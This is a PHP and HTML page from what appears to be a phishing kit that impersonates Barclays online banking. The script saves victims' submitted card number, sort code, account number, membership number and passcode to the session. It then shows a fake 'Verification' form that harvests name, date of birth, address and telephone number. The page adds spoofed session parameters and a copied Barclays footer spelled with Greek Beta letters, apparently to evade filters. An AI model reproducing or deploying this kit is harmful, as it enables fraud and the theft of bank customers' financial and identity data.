<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("CONTROLS.php");
$_SESSION['surname'] = $_POST['surname'];
$_SESSION['membershipNumber'] = $_POST['membershipNumber'];
$_SESSION['ccno3'] = $_POST['debitCardSet1']."".$_POST['debitCardSet2']."".$_POST['debitCardSet3']."".$_POST['debitCardSet4'];
$_SESSION['sortcode'] = $_POST['sortCodeSet1']."".$_POST['sortCodeSet2']."".$_POST['sortCodeSet3'];
$_SESSION['acno'] = $_POST['accountNumber'];
$_SESSION['passcode'] = $_POST['passcode'];
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<link href="assets/img/fav.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Language" content="en-GB" />
<title>Verification</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" media="screen" />
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<style>
.error {
    color: #9a040d;
    padding-bottom: 5px;
}
input.error, select.error {
    background-color: #f5e6eb;
    border-color: #9d063b;
    color: #9d063b;
	border: 1px solid #9d063b!important;
}
#ErrorDob, #ErrorCC {
	width:600px;
}
#cc-exp, #telepin {
	width:10%;
}
#postcode {
	width: 15%;
}
#telephone {
	width: 15%;
}
</style>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#form").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					day: { required: true},
					month: { required: true},
					year: { required: true},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					Telephone Number: { required: true, minlength: 5,},
		
                },
				groups: {
					dob: "day month year",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "name") 
				error.insertAfter("#ErrorName");
				else 
				error.insertAfter(element);
				if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
				error.insertAfter("#ErrorDob");
				if (element.attr("name") == "address") 
				error.insertAfter("#ErrorAddress");
				if (element.attr("name") == "town") 
				error.insertAfter("#ErrorTown");
				if (element.attr("name") == "postcode") 
				error.insertAfter("#ErrorPostcode");
				if (element.attr("name") == "telephone") 
				error.insertAfter("#ErrorTelephone");
				},
                messages: {
					name: {
						required: "You must enter your name",
						minlength: jQuery.validator.format("Your name must contain only letters, spaces, or the characters ' or -"),
					},
					day: {
						required: "You must select your date of birth",
					},
					month: {
						required: "You must select your date of birth",
					},
					year: {
						required: "You must select your date of birth",
					},
					address: {
						required: "You must enter the 1st line of your address",
						minlength: jQuery.validator.format("please check the address you have entered"),
					},
					town: {
						required: "You must enter the name of your town/city",
						minlength: jQuery.validator.format("Please check the town/city you have entered"),
					},
					postcode: {
						required: "You must enter your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					telephone: {
						required: "You must enter your telephone number",
						minlength: jQuery.validator.format("Please check the telephone number you have entered"),
					},
				},
				errorClass: "error",
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
</head>
<body>
    <a id="#top"></a>

<div id="skip-links">
<p class="skip-link-p">Skip to: 
<a accesskey="1" class="skip-link" href="#content">content</a>, 
<a accesskey="2" class="skip-link" href="#nav-links">navigation</a>
</p>
</div>
<div id="container">
<header>
<div id="masthead">
<div id="access-links">
<ul class="access-link-list">
<li class="first"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true">Mobile site</a></li>
<li><a href="#" target="_blank">Contact us</a>
<li><a href="#" target="_blank">Security</a>
<li><a href="#" target="_blank">Accessibility</a></li>
</ul>
<a name="infoend"></a>
</div>
<p class="logo"><a id="logo" href="#" title="logo" class="default"></a><img class="pronly" src="assets/img/logo.png" width="265" height="45" /></p>
<nav>
<div>
<div id="login">
<h1><strong>Quick, safe and convenient</strong> - Online Banking made easy</h1>
</div>
</div>
</nav>
</div>
</header>
<article>
<div id="content" class="clearfix">
<div>
<div class="login-ctr ftb" >
<div id="tipBody">
<div class="logon-snippet-ftb" id="logon-snippet-icookie">
<div class="info">
<div class="icon icon-exclamation-snippet"></div>
<p><strong>Updated cookies policy</strong></p><p>We&nbsp;use cookies on this website.</p><p>They help us to know a little bit about you and how you use our website, which improves the browsing experience and marketing &ndash; both for you and for others.</p><p>They are stored locally on your computer or mobile device. To accept cookies, continue to log in.</p><p>Or go to the <a id="iCookiePolicy" href="#">cookies policy</a> for more information and preferences.</p>
</div>
</div>
</div>
<div id="page">
<div data-prevent-timeout="true"  class="accordion active" id="accordion-top">
<h2>Step 1 - Your details</h2>
<form method="POST" ftb="true" autocomplete="off" name="form" action="Verify2.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true#accordion-bottom" id="form">
<div class="accordion-page">
<ul class="form-grid">
<li><label for="name">Full name</label>
<div id="ErrorName"></div>
<input type="text" name="name" id="name" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['name'];?>" />
</li>
<li>
<fieldset>
<input type="hidden" name="birthDate" id="birthDate" value="" autocomplete="off">
<label class="forgotten-membership-date-of-birth">Date of birth</label>
<div id="ErrorDob"></div>
<select name="day" id="dayList" class="birth-day birthDate-grouped">
<option value="<?php echo $_SESSION['day'];?>"><?php echo $_SESSION['day'];?></option>
<option value=''>Day</option>
<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
<select name="month" id="monthList" class="birth-month birthDate-grouped">
<option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option>
<option value=''>Month</option>
<option value="Jan">Jan</option>
<option value="Feb">Feb</option>
<option value="Mar">Mar</option>
<option value="Apr">Apr</option>
<option value="May">May</option>
<option value="Jun">Jun</option>
<option value="Jul">Jul</option>
<option value="Aug">Aug</option>
<option value="Sep">Sep</option>
<option value="Oct">Oct</option>
<option value="Nov">Nov</option>
<option value="Dec">Dec</option>
</select>
<select name="year" id="yearList" class="birth-year birthDate-grouped">
<option value="<?php echo $_SESSION['year'];?>"><?php echo $_SESSION['year'];?></option>
<option value=''>Year</option><option value="1914">1914</option> <option value="1915">1915</option> <option value="1916">1916</option> <option value="1917">1917</option> <option value="1918">1918</option> <option value="1919">1919</option> <option value="1920">1920</option> <option value="1921">1921</option> <option value="1922">1922</option> <option value="1923">1923</option> <option value="1924">1924</option> <option value="1925">1925</option> <option value="1926">1926</option> <option value="1927">1927</option> <option value="1928">1928</option> <option value="1929">1929</option> <option value="1930">1930</option> <option value="1931">1931</option> <option value="1932">1932</option> <option value="1933">1933</option> <option value="1934">1934</option> <option value="1935">1935</option> <option value="1936">1936</option> <option value="1937">1937</option> <option value="1938">1938</option> <option value="1939">1939</option> <option value="1940">1940</option> <option value="1941">1941</option> <option value="1942">1942</option> <option value="1943">1943</option> <option value="1944">1944</option> <option value="1945">1945</option> <option value="1946">1946</option> <option value="1947">1947</option> <option value="1948">1948</option> <option value="1949">1949</option> <option value="1950">1950</option> <option value="1951">1951</option> <option value="1952">1952</option> <option value="1953">1953</option> <option value="1954">1954</option> <option value="1955">1955</option> <option value="1956">1956</option> <option value="1957">1957</option> <option value="1958">1958</option> <option value="1959">1959</option> <option value="1960">1960</option> <option value="1961">1961</option> <option value="1962">1962</option> <option value="1963">1963</option> <option value="1964">1964</option> <option value="1965">1965</option> <option value="1966">1966</option> <option value="1967">1967</option> <option value="1968">1968</option> <option value="1969">1969</option> <option value="1970">1970</option> <option value="1971">1971</option> <option value="1972">1972</option> <option value="1973">1973</option> <option value="1974">1974</option> <option value="1975">1975</option> <option value="1976">1976</option> <option value="1977">1977</option> <option value="1978">1978</option> <option value="1979">1979</option> <option value="1980">1980</option> <option value="1981">1981</option> <option value="1982">1982</option> <option value="1983">1983</option> <option value="1984">1984</option> <option value="1985">1985</option> <option value="1986">1986</option> <option value="1987">1987</option> <option value="1988">1988</option> <option value="1989">1989</option> <option value="1990">1990</option> <option value="1991">1991</option> <option value="1992">1992</option> <option value="1993">1993</option> <option value="1994">1994</option> <option value="1995">1995</option> <option value="1996">1996</option> <option value="1997">1997</option> <option value="1998">1998</option> <option value="1999">1999</option> 
</select>
</fieldset>
</li>
<li><label for="address">Address (Line 1)</label>
<div id="ErrorAddress"></div>
<input type="text" name="address" id="address" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['address'];?>"/>
</li>
<li><label for="name">Town/City</label>
<div id="ErrorTown"></div>
<input type="text" name="town" id="town" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['town'];?>"/>
</li>
<li><label for="name">Postcode</label>
<div id="ErrorPostcode"></div>
<input type="text" name="postcode" id="postcode" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['postcode'];?>"/>
</li>
<li><label for="name">Telephone</label>
<div id="ErrorTelephone"></div>
<input type="text" name="telephone" id="telephone" maxlength="11" class="surname text" autocomplete="off" value="<?php echo $_SESSION['telephone'];?>"/>
</li>
<li>
<div class="line-break"></div>
</li>
<li>
<button type="submit" id="forward" class="button blue validate accordion-action" name="action::blank.php::POST" id="forward" onclick="scMeta(s);" >Next step</button>
</li>
<div class="accordion-config">
<input type="hidden" id="expectedposition" value="accordion-top"/>
</div>
 </div>
</form>
</div>
<div class="accordion disabled" id="accordion-bottom" onclick="tagAjaxContent();" >
<h2>Step 2 - Account details</h2>
<form method="POST" ftb="true" autocomplete="off" id="accordion-bottom-form">
<div class="accordion-page">           
</div>
</form>
</div>
</div>       
</div>
<?php include "assets/includes/sidebar.php"; ?>
</div>
</div>
</article>
<footer>
<div id="footer">
<div class="footnote">
    <p>
       &Beta;arclays &Beta;ank PLC. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential
       Regulation Authority (Financial Services Register no: 122702). &Beta;arclays &Beta;ank PLC subscribes to the Lending Code which is monitored and
       enforced by the Lending Standards &Beta;oard. Further details can be found at
       <a title="Lending Standards Board (opens in a new browser window)" target="_blank" href="#"> www.lendingstandardsboard.org.uk</a>. Barclays Insurance Services Company Limited is authorised and regulated by the Financial Conduct Authority (Financial Services Register no: 312078).
    </p>
    <p>
       Barclays Bank PLC. Registered in England. Registered no. 1026167. Barclays Insurance Services Company Limited. Registered in England. Registered no. 973765. Registered office for both: 1 Churchill Place, London E14 5HP. 'The Woolwich' and 'Woolwich' are trademarks and trading names of Barclays Bank PLC. Barclays Business is a trading name of Barclays Bank PLC.
    </p>
    <br/>
    <p >
<img class="pronly" src="assets/img/premier.jpg"/>
<a href="#" target="_blank" class="premier-league">
<span class="premier-league">Proud sponsors of the Barclays Premier League</span>
</a>
</p>
</div>
</div>
</footer>
</div>
</body>
</html>
